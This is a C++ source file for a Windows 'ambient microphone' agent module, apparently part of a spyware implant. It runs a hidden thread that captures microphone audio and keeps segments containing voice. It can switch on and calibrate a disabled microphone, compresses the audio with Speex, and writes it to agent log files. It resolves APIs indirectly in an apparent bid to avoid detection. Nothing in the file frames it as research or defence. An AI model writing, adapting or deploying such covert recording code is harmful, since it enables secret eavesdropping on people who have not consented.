#include <Windows.h>
#include <new>
#include <stdio.h>
#include "..\common.h"
#include "..\LOG.h"
#include "..\HM_SafeProcedures.h"

#undef _WIN32_WINNT
#define _WIN32_WINNT 0x0600
#include "QAmbientalMicrophone.h"
#include "QVistaMicrophone.h"
#include "XPMic.h"

BOOL bAmbientalMicSemaphore;

speex_encoder_init_t amb_rel_speex_encoder_init;
speex_encoder_ctl_t amb_rel_speex_encoder_ctl;
speex_encoder_destroy_t amb_rel_speex_encoder_destroy;
speex_encode_t amb_rel_speex_encode;
speex_bits_init_t amb_rel_speex_bits_init;
speex_bits_reset_t amb_rel_speex_bits_reset;
speex_bits_write_t amb_rel_speex_bits_write;
speex_bits_destroy_t amb_rel_speex_bits_destroy;
speex_lib_get_mode_t amb_rel_speex_lib_get_mode;

typedef struct _MicAdditionalData {
	UINT uVersion;
		#define LOG_MIC_VERSION 2008121901
	UINT uSampleRate;
	FILETIME fId;
} MicAdditionalData, *pMicAdditionalData;


typedef BOOL (WINAPI *GetVersionEx_t) (OSVERSIONINFO *);
void IndirectGetVersionEx(OSVERSIONINFO *ovi)
{
	HMODULE hmod = NULL;
	GetVersionEx_t pGetVersionEx = NULL;

	hmod = GetModuleHandle("kernel32.dll");
	if (hmod)
		pGetVersionEx = (GetVersionEx_t)HM_SafeGetProcAddress(hmod, "GetVersionExA");
	if (pGetVersionEx)
		pGetVersionEx(ovi);
}

// hSpeex  -> HMODULE che deve puntare alla DLL di Speex (usato per risolvere i simboli)
// bModify -> Se TRUE il microfono viene abilitato (se disabilitato) e calibrato. Se FALSE
//			  non viene toccato
// uChunk  -> Secondi di registrazione che vengono tenuti in RAM
QAmbientalMicrophone::QAmbientalMicrophone(HMODULE hSpeex, BOOL bModify, UINT uThreshold, INT iSilence)
{
	OSVERSIONINFO ovi;

	// Queste due variabili devono essere inizializzate qui
	bAmbientalMicSemaphore = FALSE;
	hThread = FALSE;

	if(hSpeex == NULL)
		return;

	dwTid = 0;

	ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	IndirectGetVersionEx(&ovi);

	switch(ovi.dwMajorVersion){
		case 6:	// Vista
			bVista = TRUE;
			break;

		default:
			bVista = FALSE;
			break;
	}

	bCalibrate = bModify;
	iSilenceBlocks = iSilence;
	uVoiceThreshold = uThreshold;

	if (!ResolveCodecSymbols(hSpeex))
		return;

	hThread = HM_SafeCreateThread(NULL, 0, QAmbientalMicrophone::ThreadProc, (LPVOID)this, NULL, &dwTid);
}

QAmbientalMicrophone::~QAmbientalMicrophone()
{
	QUERY_CANCELLATION(hThread, bAmbientalMicSemaphore)
}


DWORD WINAPI QAmbientalMicrophone::ThreadProc(LPVOID obj)
{
	QAmbientalMicrophone *object = (QAmbientalMicrophone *)obj;
	QVistaMicrophone *vista;
	CXPMixer *xp;
	PBYTE pBuf = NULL;
	UINT uLen;
	BOOL bVoc;
	SYSTEMTIME st;
	FILETIME ft;

	if(object->bVista){
		vista = new QVistaMicrophone(object->bCalibrate, object->uVoiceThreshold, object->iSilenceBlocks);

		LOOP {
			CANCELLATION_POINT_DELETE(bAmbientalMicSemaphore, vista)

			if(vista->AcquireMic(&pBuf) == FALSE) {
				Sleep(450);
				continue;
			}

			uLen = vista->GetBufferSize();
			bVoc = vista->IsVoice(); // C'e' voce nel chunk?

			if(bVoc == TRUE || vista->Silent() == FALSE) {
				st = vista->GetTimeStamp();			
				memset(&ft, 0, sizeof(ft));
				FNC(SystemTimeToFileTime)(&st, &ft);
				WaveWrite(vista->GetSampleRate(), &ft, pBuf, uLen);
			}
		}
	}else{
		xp = new CXPMixer(object->bCalibrate, object->uVoiceThreshold, object->iSilenceBlocks);
		if (xp->Initialize()) {
			LOOP {
				CANCELLATION_POINT_DELETE(bAmbientalMicSemaphore, xp)
			
				if(xp->AcquireMic(&pBuf) == FALSE){
					Sleep(450);
					continue;			
				}
			
				uLen = xp->GetBufferSize();
				bVoc = xp->IsVoice(); // C'e' voce nel chunk?

				if(bVoc == TRUE || xp->Silent() == FALSE){
					st = xp->GetTimeStamp();			
					memset(&ft, 0, sizeof(ft));
					FNC(SystemTimeToFileTime)(&st, &ft);
					WaveWrite(44100, &ft, pBuf, uLen);
				}
			}
		}
		LOOP {
			CANCELLATION_POINT_DELETE(bAmbientalMicSemaphore, xp)
			Sleep(300);
		}
	}

	// XXX L'esecuzione qui non deve MAI arrivare
	return 0;
}

BOOL QAmbientalMicrophone::ResolveCodecSymbols(HMODULE hcodec)
{
	if (!hcodec)
		return FALSE;

	if (! (amb_rel_speex_encoder_init = (speex_encoder_init_t)GetProcAddress(hcodec, "speex_encoder_init")) ) return FALSE;
	if (! (amb_rel_speex_encoder_ctl = (speex_encoder_ctl_t)GetProcAddress(hcodec, "speex_encoder_ctl")) ) return FALSE;
	if (! (amb_rel_speex_encoder_destroy = (speex_encoder_destroy_t)GetProcAddress(hcodec, "speex_encoder_destroy")) ) return FALSE;
	if (! (amb_rel_speex_encode = (speex_encode_t)GetProcAddress(hcodec, "speex_encode")) ) return FALSE;
	if (! (amb_rel_speex_bits_init = (speex_bits_init_t)GetProcAddress(hcodec, "speex_bits_init")) ) return FALSE;
	if (! (amb_rel_speex_bits_reset = (speex_bits_reset_t)GetProcAddress(hcodec, "speex_bits_reset")) ) return FALSE;
	if (! (amb_rel_speex_bits_write = (speex_bits_write_t)GetProcAddress(hcodec, "speex_bits_write")) ) return FALSE;
	if (! (amb_rel_speex_bits_destroy = (speex_bits_destroy_t)GetProcAddress(hcodec, "speex_bits_destroy")) ) return FALSE;
	if (! (amb_rel_speex_lib_get_mode = (speex_lib_get_mode_t)GetProcAddress(hcodec, "speex_lib_get_mode")) ) return FALSE;

	return TRUE;
}

#define SAMPLE_SIZE 2
#define NCHANNELS 2
#define AMB_SPEEX_FREE	{amb_rel_speex_encoder_destroy(state); amb_rel_speex_bits_destroy(&bits);}
BOOL QAmbientalMicrophone::WaveWrite(DWORD sample_rate, FILETIME *Fid, PBYTE data, UINT total_size){
#define MODE_UWB 2
	HANDLE hf;
	short *bit_sample;
	void *state;
	float *input;
	BYTE *to_write;
	BYTE *source_ptr, *source;
	BYTE *cbits;
	SpeexBits bits;
	DWORD frame_size = 0;
	DWORD i, nbBytes;	
	DWORD complexity = 1;
	DWORD compress_factor = 3;
	MicAdditionalData mic_additional_header;

	if (total_size == 0)
		return FALSE;

	// Crea un nuovo encoder in narrow mode
	state = amb_rel_speex_encoder_init(amb_rel_speex_lib_get_mode(MODE_UWB));
	amb_rel_speex_encoder_ctl(state, SPEEX_SET_QUALITY, &compress_factor);
	amb_rel_speex_encoder_ctl(state, SPEEX_SET_COMPLEXITY, &complexity);
	amb_rel_speex_bits_init(&bits);
	amb_rel_speex_encoder_ctl(state, SPEEX_GET_FRAME_SIZE, &frame_size);

	if (!frame_size) {
		AMB_SPEEX_FREE;
		return FALSE;
	}
	// Allochiamo il buffer di output grande quanto quello originale (per sicurezza)
	if (!(to_write = (BYTE *)malloc(frame_size*SAMPLE_SIZE + sizeof(DWORD)))) {
		AMB_SPEEX_FREE;
		return FALSE;
	}
	cbits = to_write + sizeof(DWORD); // Punta al blocco dati, mentre la prima DWORD conterra' la dimensione
	// Allochiamo il buffer di elaborazione
	if (!(input = (float *)malloc(frame_size*sizeof(float)))) {
		SAFE_FREE(to_write);
		AMB_SPEEX_FREE;
		return FALSE;
	}

	mic_additional_header.uVersion = LOG_MIC_VERSION;
	mic_additional_header.uSampleRate = sample_rate;
	memcpy(&(mic_additional_header.fId), Fid, sizeof(FILETIME));
	
	hf = Log_CreateFile(PM_AMBMICAGENT, (BYTE *)&mic_additional_header, sizeof(mic_additional_header));
	// Continua finche' dopo source_ptr non rimane ancora spazio per un frame intero
	source = (BYTE *)data;
	for (source_ptr=source; source_ptr+(frame_size*SAMPLE_SIZE*NCHANNELS)<=source+total_size; source_ptr+=(frame_size*SAMPLE_SIZE*NCHANNELS)) {
		bit_sample = (short *)source_ptr;
		// Prendiamo solo uno dei due canali
		for (i=0; i<frame_size; i++) 
			input[i] = bit_sample[i*NCHANNELS];

		amb_rel_speex_bits_reset(&bits);
		amb_rel_speex_encode(state, input, &bits);
		// Encoda dentro il buffer di output
		nbBytes = amb_rel_speex_bits_write(&bits, (char *)cbits, frame_size*SAMPLE_SIZE);
		if (nbBytes > (frame_size*SAMPLE_SIZE))
			continue; // Check paranoico
		// Copia la lunghezza nei primi 4 byte per fare un unica scrittura su file
		memcpy(to_write, &nbBytes, sizeof(DWORD)); 
		Log_WriteFile(hf, to_write, nbBytes+sizeof(DWORD));
	}

	Log_CloseFile(hf);
	SAFE_FREE(to_write);
	SAFE_FREE(input);
	AMB_SPEEX_FREE;
	return TRUE;
}

